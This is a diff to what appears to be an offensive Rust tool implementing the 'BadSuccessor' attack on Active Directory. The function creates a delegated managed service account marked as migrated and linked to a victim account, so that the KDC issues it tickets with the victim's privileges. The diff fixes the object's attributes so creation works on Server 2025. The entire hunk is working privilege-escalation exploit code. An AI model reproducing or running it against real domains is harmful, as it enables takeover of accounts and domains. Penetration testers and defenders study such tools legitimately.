@@ -4222,23 +4222,33 @@ async fn badsuccessor(a: BadsuccessorArgs) -> Result<()> {
     let name = a.dmsa_name.trim_end_matches('$');
     let sam = format!("{name}$");
     let dn = format!("CN={name},{container}");
+    // Derive DNS domain from base DN: "DC=testlab,DC=local" -> "testlab.local".
+    let dns_domain: String = base
+        .split(',')
+        .filter_map(|p| p.trim().strip_prefix("DC=").or_else(|| p.trim().strip_prefix("dc=")))
+        .collect::<Vec<_>>()
+        .join(".");
+    let dns_host = format!("{name}.{dns_domain}");
 
+    // dMSA is a subclass of msDS-GroupManagedServiceAccount (structural, inherits from computer).
+    // Adding `computer`/`user`/`person` explicitly conflicts with the schema on Server 2025 —
+    // let the structural chain resolve them.
     let attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
         (
             "objectClass",
             vec![
                 b"top".to_vec(),
-                b"person".to_vec(),
-                b"organizationalPerson".to_vec(),
-                b"user".to_vec(),
-                b"computer".to_vec(),
-                b"msDS-GroupManagedServiceAccount".to_vec(),
                 b"msDS-DelegatedManagedServiceAccount".to_vec(),
             ],
         ),
         ("sAMAccountName", vec![sam.as_bytes().to_vec()]),
+        ("dNSHostName", vec![dns_host.as_bytes().to_vec()]),
         // UAC = WORKSTATION_TRUST_ACCOUNT (0x1000).
         ("userAccountControl", vec![b"4096".to_vec()]),
+        // AES256 | AES128 | RC4 = 28 (minimum modern default).
+        ("msDS-SupportedEncryptionTypes", vec![b"28".to_vec()]),
+        // Required by gMSA schema — 30 days is the default rotation.
+        ("msDS-ManagedPasswordInterval", vec![b"30".to_vec()]),
         // 2 = kMSA_MIGRATED — the "successor" state the KDC recognises.
         ("msDS-DelegatedMSAState", vec![b"2".to_vec()]),
         // The victim link — the KDC issues the dMSA a TGT with THIS account's PAC.
